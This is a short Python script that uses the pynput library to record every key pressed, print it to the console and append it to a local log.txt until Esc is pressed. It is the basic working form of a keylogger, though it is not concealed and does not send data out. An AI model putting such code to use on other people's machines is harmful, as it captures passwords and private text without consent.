from pynput.keyboard import Key, Listener

keys = []

def on_press(key):
    keys.append(key)
    write_file(keys)
    try:
        print(f"Alphanumeric key {key.char} pressed")
    except AttributeError:
        print(f"Special key {key} pressed")

def write_file(keys):
    with open("log.txt", "a") as f:  # Append mode
        for key in keys:
            if hasattr(key, 'char'):  # For alphanumeric keys
                f.write(key.char + " ")
            else:  # For special keys
                f.write(str(key).replace("Key.", "").upper() + " ")
        keys.clear()  # Clear list to avoid duplicate writes

def on_release(key):
    print(f"{key} released")
    if key == Key.esc:
        return False  # Stop listener

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
